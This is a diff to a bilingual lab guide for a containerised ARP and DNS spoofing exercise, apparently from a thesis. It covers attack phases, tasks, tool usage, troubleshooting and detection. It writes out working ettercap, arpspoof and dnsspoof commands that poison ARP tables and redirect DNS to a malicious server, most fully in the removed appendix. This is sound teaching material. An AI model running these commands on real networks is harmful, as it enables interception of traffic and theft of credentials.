+    4. **Attacker** responds with the malicious server's IP (192.168.1.100)
+    5. **Victim** connects to the malicious server believing it's the legitimate server
+
+!!! tip "Flujo del ataque MITM"
+    1. **Víctima** (192.168.1.30) intenta comunicarse con el gateway
+    2. **Atacante** (192.168.1.20) responde con su propia MAC via ARP spoofing
+    3. **Todo el tráfico** de la víctima pasa por el atacante
+    4. **Consultas DNS** son interceptadas y modificadas antes de llegar al DNS server
+    5. **Víctima recibe** respuesta DNS modificada que apunta al servidor malicioso
+
+## 🎯 Detailed MITM Attack Explanation
+
+### Phase 1: Attacker Preparation
+
+The attacker needs to position themselves as an intermediary between the victim and the DNS server.
+
+```mermaid
+graph LR
+    subgraph "Normal Situation"
+        V1[Victim<br/>192.168.1.30] --> D1[DNS Server<br/>192.168.1.4] --> W1[Web Server<br/>192.168.1.10]
+    end
+    
+    subgraph "After ARP Spoofing"
+        V2[Victim<br/>192.168.1.30] --> A[Attacker<br/>192.168.1.20] --> M[Malicious Server<br/>192.168.1.100]
+    end
+```
+
+### Phase 2: DNS Interception and Modification
+
+The attacker impersonates the DNS server and responds directly to queries:
+
+```mermaid
+sequenceDiagram
+    participant V as Victim<br/>192.168.1.30
+    participant A as Attacker<br/>192.168.1.20
+    participant D as DNS Server<br/>192.168.1.4
+    participant M as Malicious Server<br/>192.168.1.100
+    
+    V->>A: DNS Query: goodserver.com? (believes it's the DNS server)
+    Note over A: Does NOT query the real DNS
+    A->>V: Response: goodserver.com = 192.168.1.100
+    V->>M: HTTP Request to "goodserver.com"
+    M->>V: Malicious Response
+```
+
+### Phase 3: Exploitation
+
+The victim, unknowingly, is communicating with the malicious server:
+
+!!! danger "Consequences of successful attack"
+    - **Credential theft**: The malicious server can present fake forms
+    - **Malware injection**: Can serve malicious content 
+    - **Data exfiltration**: All traffic passes through the attacker
+    - **Advanced phishing**: Fake websites with valid certificates (if using HTTPS spoofing)
+
+## 🔍 Monitoring and Analysis
+
+### Traffic Capture
+
+```bash
+# Capture traffic on container interface
+tcpdump -i eth0 -w /tmp/capture.pcap
+
+# Filter only ARP traffic
+tcpdump -i eth0 arp
+
+# Filter only HTTP traffic
+tcpdump -i eth0 port 80
+```
+
+### Log Analysis
+
+!!! info "Monitoring Points"
+    1. **DNS Server**: DNS query logs
+    2. **Web Servers**: HTTP access logs
+    3. **Attacker**: Intercepted traffic
+    4. **Victim**: ARP table changes
+
+## 🛡️ Detection and Prevention
+
+### Compromise Indicators
+
+!!! warning "Signs of ARP Spoofing"
+    - Frequent changes in ARP table
+    - Multiple MACs for the same IP
+    - Unusual network latency
+    - Invalid SSL/TLS certificates
+
+### Countermeasures
+
+```bash
+# Static ARP (prevention)
+arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
+
+# Continuous ARP monitoring
+watch -n 1 'arp -a'
+
+# DNS spoofing detection
+dig goodserver.com @8.8.8.8  # Verify with external DNS
+```
+
+## 🧪 Practical Laboratory
+
+### Exercise 1: Basic ARP Spoofing
+
+!!! question "Task 1.1: Reconnaissance"
+    1. Launch the environment: `docker-compose up -d`
+    2. Access the Kali container: `docker-compose exec kali_attacker bash`
+    3. Execute reconnaissance: `/scripts/network_recon.sh`
+    4. Identify all active hosts on the network
+
+!!! question "Task 1.2: ARP Spoofing"
+    1. Execute the interactive menu: `/scripts/lab1_menu.sh`
+    2. Select option 3 (ARP Spoofing)
+    3. Configure victim: `192.168.1.30` and gateway: `192.168.1.1`
+    4. Verify in separate terminal: `docker-compose exec http_requester arp -a`
+
+### Exercise 2: DNS Spoofing
+
+!!! question "Task 2.1: Configuración del MITM completo"
+    
+    **Opción A: Verificar herramientas primero**
+    ```bash
+    docker-compose exec kali_attacker bash
+    /scripts/verify_tools.sh
+    ```
+    
+    **Opción B: Usar el menú interactivo (recomendado)**
+    ```bash
+    docker-compose exec kali_attacker bash
+    /scripts/lab1_menu.sh
+    # Seleccionar opción 4 (DNS Spoofing)
+    ```
+    
+    **Option C: Manual method (for learning)**
+    ```bash
+    docker-compose exec kali_attacker bash
+    /scripts/dns_spoof.sh 192.168.1.30 192.168.1.4 192.168.1.100 goodserver.com
+    ```
+    
+    **Verificación del ataque:**
+    1. **Verificar tabla ARP en víctima**: Comprobar que el DNS server está comprometido
+       ```bash
+       docker-compose exec http_requester arp -a
+       # Debería mostrar la MAC del atacante para el DNS server (192.168.1.4)
+       ```
+    
+    2. **Verificar DNS**: Comprobar que las consultas DNS están siendo redirigidas
+       ```bash
+       docker-compose exec http_requester nslookup goodserver.com
+       # Debería devolver 192.168.1.100 (servidor malicioso)
+       ```
+
+!!! question "Task 2.2: Análisis del tráfico interceptado"
+    1. En un segundo terminal, iniciar captura de tráfico:
+       ```bash
+       docker-compose exec kali_attacker /scripts/traffic_capture.sh eth0 180
+       ```
+    2. Observar cómo las consultas DNS van directamente al atacante
+    3. Verificar que no hay comunicación con el DNS server real (192.168.1.4)
+
+!!! question "Task 2.3: Troubleshooting"
+    If attacks don't work, run diagnostics:
+    ```bash
+    # Verificar herramientas
+    docker-compose exec kali_attacker /scripts/verify_tools.sh
+    
+    # Verificar estado de la red
+    docker-compose exec kali_attacker /scripts/lab1_menu.sh
+    # Seleccionar opción 7 (Verificar estado de la red)
+    ```
+
+### Exercise 3: Forensic Analysis
+
+!!! question "Task 3.1: Forensic Analysis"
+    1. Execute capture: `/scripts/traffic_capture.sh eth0 180`
+    2. Analyze generated `.pcap` file
+    3. Identify attack patterns in traffic
+    4. Document found evidence
+
+### Comandos Útiles para Verificación
+
+```bash
+# Verificar servicios activos
+docker-compose ps
+
+# Monitorear logs del requester
+docker-compose logs -f http_requester
+
+# Ver logs del DNS server
+docker-compose logs -f dns
+
+# Acceso directo a contenedores
+docker-compose exec kali_attacker /scripts/lab1_menu.sh
+docker-compose exec parrot_attacker bash
+
+# Verificar conectividad entre contenedores
+docker-compose exec http_requester ping 192.168.1.20  # Kali
+docker-compose exec http_requester ping 192.168.1.21  # Parrot
+```
+
+## 📊 Resultados Esperados
+
+### Antes del Ataque
+
+```bash
+# Tabla ARP en víctima
+Gateway (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
+
+# DNS Resolution
+goodserver.com. 300 IN A 192.168.1.10
+```
+
+### Durante el Ataque
+
+```bash
+# Tabla ARP en víctima (comprometida)
+DNS Server (192.168.1.4) at xx:yy:zz:aa:bb:cc [ether] on eth0  # MAC del atacante
+
+# DNS Resolution (comprometida)
+goodserver.com. 300 IN A 192.168.1.100  # IP del servidor malicioso
+
+# Flujo del tráfico
+Víctima (192.168.1.30) -> Atacante (192.168.1.20) -> Servidor Malicioso (192.168.1.100)
+```
+
+!!! info "Explicación del flujo comprometido"
+    1. **Víctima**: Intenta resolver `goodserver.com` 
+    2. **Consulta DNS**: Va hacia el atacante (que se hace pasar por el servidor DNS)
+    3. **Atacante**: Responde directamente con la IP del servidor malicioso (NO consulta al DNS real)
+    4. **Víctima**: Recibe `192.168.1.100` en lugar de `192.168.1.10`
+    5. **Conexión HTTP**: Se establece con el servidor malicioso sin que la víctima lo sepa
+    6. **DNS real**: Nunca recibe la consulta, permanece completamente ajeno al ataque
+
+## 🔧 Available Tools
+
+### Kali Linux Container (192.168.1.20)
+
+| Tool | Purpose | Typical Usage |
+|-------------|-----------|------------|
+| **ettercap** | Classic ARP/DNS spoofing | `ettercap -T -M arp:remote /victim// /gateway//` |
+| **tcpdump** | Packet capture | `tcpdump -i eth0 -w capture.pcap` |
+| **nmap** | Network reconnaissance | `nmap -sn 192.168.1.0/24` |
+| **arp-scan** | ARP discovery | `arp-scan -l` |
+| **dsniff** | MITM tool suite | `arpspoof -i eth0 -t victim gateway` |
+
+### Parrot Security Container (192.168.1.21)
+
+| Tool | Purpose | Typical Usage |
+|-------------|-----------|------------|
+| **bettercap** | Modern MITM framework | `bettercap -iface eth0` |
+| **mitmproxy** | Interactive HTTP/HTTPS proxy | `mitmdump --mode transparent` |
+| **masscan** | Fast port scanning | `masscan -p80,443 192.168.1.0/24` |
+| **scapy** | Python packet manipulation | Custom scripts |
+
+### Automated Scripts
+
+```bash
+# Available scripts in /scripts/
+├── lab1_menu.sh          # Main interactive menu
+├── network_recon.sh      # Automatic reconnaissance
+├── arp_spoof.sh         # ARP spoofing with ettercap
+├── dns_spoof.sh         # Combined DNS spoofing (FIXED)
+├── traffic_capture.sh   # Traffic capture (IMPROVED)
+├── monitor.sh           # Monitor ARP/DNS changes
+└── verify_tools.sh      # Tool verification (NEW)
+```
+
+!!! info "Script improvements made"
+    **dns_spoof.sh**: Fixed to perform ARP spoofing against DNS server (192.168.1.4)
+    **arp_spoof.sh**: Updated to support both gateway and DNS server as target
+    **traffic_capture.sh**: Improved process handling and cleanup
+    **verify_tools.sh**: New script to verify tool installation
+    **lab1_menu.sh**: Updated with correct parameters for the laboratory
+
+## 🐛 Troubleshooting
+
+### Problemas Comunes en MITM
+
+!!! warning "Herramientas no instaladas correctamente"
+    ```bash
+    # Verificar instalación de herramientas
+    docker-compose exec kali_attacker /scripts/verify_tools.sh
+    
+    # Si ettercap no funciona, reconstruir el contenedor
+    docker-compose build --no-cache kali_attacker
+    ```
+
+!!! warning "El ARP spoofing no funciona"
+    ```bash
+    # Verificar que el IP forwarding está habilitado
+    docker-compose exec kali_attacker cat /proc/sys/net/ipv4/ip_forward
+    
+    # Habilitarlo manualmente si es necesario
+    docker-compose exec kali_attacker sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
+    
+    # Verificar capacidades de red
+    docker-compose exec kali_attacker capsh --print
+    ```
+
+!!! warning "DNS spoofing no redirecciona correctamente"
+    ```bash
+    # Verificar que ettercap tiene el plugin dns_spoof
+    docker-compose exec kali_attacker ettercap -P list | grep dns_spoof
+    
+    # Verificar que el archivo de configuración DNS existe
+    docker-compose exec kali_attacker cat /tmp/dns_spoof.conf
+    
+    # Verificar que el ataque usa el DNS server correcto
+    docker-compose exec kali_attacker ping 192.168.1.4
+    ```
+
+!!! warning "El tráfico no pasa por el atacante"
+    ```bash
+    # Verificar la tabla ARP de la víctima
+    docker-compose exec http_requester arp -a
+    
+    # Debería mostrar la MAC del atacante para el DNS server (192.168.1.4)
+    # Si no, verificar que el ARP spoofing esté activo
+    
+    # Monitorear tráfico DNS en tiempo real
+    docker-compose exec kali_attacker tcpdump -i eth0 -n port 53
+    ```
+
+### Comandos de Diagnóstico MITM
+
+```bash
+# Script de verificación completa
+docker-compose exec kali_attacker /scripts/verify_tools.sh
+
+# Verificar estado del ataque ARP
+docker-compose exec kali_attacker arp -a
+
+# Verificar que el atacante está recibiendo tráfico de la víctima
+docker-compose exec kali_attacker tcpdump -i eth0 src 192.168.1.30
+
+# Verificar resolución DNS comprometida
+docker-compose exec http_requester nslookup goodserver.com
+
+# Verificar conectividad HTTP al servidor malicioso
+docker-compose exec http_requester curl -H "Host: goodserver.com" http://192.168.1.100
+
+# Usar el menú para diagnosticar problemas
+docker-compose exec kali_attacker /scripts/lab1_menu.sh
+```
+
+### Diagnostic Commands
+
+```bash
+# Check network connectivity
+docker network inspect $(docker-compose ps -q | head -1 | xargs docker inspect --format='{{range .NetworkSettings.Networks}}{{.NetworkID}}{{end}}')
+
+# View ARP table of all containers
+for container in $(docker-compose ps -q); do
+    echo "=== $(docker inspect $container --format='{{.Name}}') ==="
+    docker exec $container arp -a 2>/dev/null || echo "arp not available"
+done
+
+# Monitor traffic in real time
+docker-compose exec kali_attacker tcpdump -i eth0 -n
+
+# Check web services
+curl -H "Host: goodserver.com" http://192.168.1.10
+curl -H "Host: goodserver.com" http://192.168.1.100
+```
+
+### Reset Environment
+
+```bash
+# Stop all containers
+docker-compose down
+
+# Clean networks and volumes
+docker-compose down -v --remove-orphans
+
+# Rebuild everything from scratch
+docker-compose build --no-cache
+docker-compose up -d
+```
+
+## 📚 References and Additional Reading
+
+!!! info "Technical Documentation"
+    - [RFC 826 - Address Resolution Protocol](https://tools.ietf.org/html/rfc826)
+    - [RFC 1035 - Domain Names Implementation](https://tools.ietf.org/html/rfc1035)
+    - [Ettercap Documentation](https://ettercap.github.io/ettercap/)
+    - [Wireshark Documentation](https://www.wireshark.org/docs/)
+
+!!! tip "Additional Tools to Explore"
+    - **Wireshark**: Graphical network traffic analysis
+    - **Scapy**: Python library for packet manipulation
+    - **Netfilterqueue**: Intercept and modify packets in Linux
+    - **Responder**: Tool for LLMNR, NBT-NS and MDNS poisoning
+
+!!! book "Recommended Reading"
+    - "The Web Application Hacker's Handbook" - Chapters on MITM
+    - "Network Security Assessment" - Reconnaissance techniques
+    - "Metasploit: The Penetration Tester's Guide" - Network attacks
 
 ---
 
-## Appendix: Quick Reference Commands
-
-### Laboratory Startup (Docker Host)
-```bash
-# Navigate to laboratory directory
-cd TFM-Labos/src
-
-# Start the complete environment
-docker-compose up -d
-
-# Verify all services are running
-docker-compose ps
-```
-
-### Kali Linux Attack Commands
-```bash
-# Enable IP forwarding for MITM attacks
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-
-# ARP poisoning with arpspoof
-sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.4 &
-sudo arpspoof -i eth0 -t 192.168.1.4 192.168.1.30 &
-
-# ARP poisoning with ettercap (alternative)
-sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4//
-
-# DNS spoofing with ettercap
-echo "goodserver.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns
-sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4// -P dns_spoof
-
-# DNS spoofing with dnsspoof
-echo "192.168.1.100 goodserver.com" | sudo tee /tmp/dns_hosts
-sudo dnsspoof -i eth0 -f /tmp/dns_hosts host 192.168.1.30
-```
-
-### Monitoring Commands (Kali Linux)
-```bash
-# Monitor DNS traffic
-sudo tcpdump -i eth0 -n -s 0 port 53
-
-# Monitor HTTP redirection
-sudo tcpdump -i eth0 -n port 80 and host 192.168.1.30
-
-# Monitor ARP poisoning
-sudo tcpdump -i eth0 -n arp
-
-# Check ARP tables
-sudo arp -a | grep "192.168.1"
-
-# Network reconnaissance
-nmap -sn 192.168.1.0/24
-nmap -sV 192.168.1.4,192.168.1.10,192.168.1.30,192.168.1.100
-```
-
-### Verification Commands
-```bash
-# Test DNS resolution from Kali
-nslookup goodserver.com 192.168.1.4
-dig @192.168.1.4 goodserver.com
-
-# Test HTTP responses
-curl -s http://192.168.1.10 | jq   # Legitimate server
-curl -s http://192.168.1.100 | jq  # Evil server
-
-# Wireshark capture
-sudo wireshark &
-sudo tshark -i eth0 -f "net 192.168.1.0/24" -w /tmp/attack_capture.pcap
-```
-
-### Cleanup Commands (Kali Linux)
-```bash
-# Stop attack tools
-sudo pkill ettercap
-sudo pkill arpspoof
-sudo pkill dnsspoof
-
-# Clear ARP cache
-sudo ip -s -s neigh flush all
-
-# Restore network settings
-sudo sysctl net.ipv4.ip_forward=0
-sudo ip link set eth0 promisc off
-
-# Send gratuitous ARP to restore mappings
-sudo arping -c 5 -I eth0 192.168.1.4
-sudo arping -c 5 -I eth0 192.168.1.30
-```
-
-### Environment IP Reference
-```
-Kali Linux:        192.168.1.20  (Physical attack machine)
-DNS Server:        192.168.1.4   (dnsmasq container)
-Good Web Server:   192.168.1.10  (goodserver.com container)
-Evil Web Server:   192.168.1.100 (attack target container)
-Victim Client:     192.168.1.30  (requester container)
-Network Gateway:   192.168.1.1   (Physical router)
-```
-
-### Attack Flow Summary
-```
-1. Start Docker environment on host
-2. Configure Kali Linux network tools
-3. Perform network reconnaissance
-4. Execute ARP poisoning
-5. Implement DNS spoofing
-6. Monitor attack success
-7. Clean up and restore normal operation
-```
+!!! success "Laboratory Conclusion"
+    This laboratory demonstrates how ARP and DNS spoofing attacks can be executed in containerized environments, providing practical understanding of these offensive security techniques in a controlled and secure environment. 
+    
+    **Key Learning Points:**
+    
+    - ✅ Docker network configuration for pentesting
+    - ✅ Classic tools (ettercap) vs modern alternatives
+    - ✅ MITM attack detection and mitigation techniques
+    - ✅ Forensic analysis of intercepted network traffic
+    - ✅ Practical implementation of network security concepts
